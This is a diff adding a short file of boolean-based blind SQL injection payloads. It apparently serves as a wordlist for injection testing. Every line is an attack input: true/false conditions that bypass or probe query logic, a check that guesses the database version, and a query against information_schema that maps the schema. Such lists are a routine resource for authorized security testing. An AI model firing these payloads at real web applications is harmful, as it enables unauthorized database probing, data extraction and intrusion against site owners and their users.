@@ -1,0 +1,11 @@
+# Boolean-based blind SQL injection payloads
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a'--
+' AND 'a'='b'--
+' AND SUBSTRING(@@version,1,1)='5'--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+1 AND 1=1
+1 AND 1=2
+' OR 1=1#
+' OR 1=2#
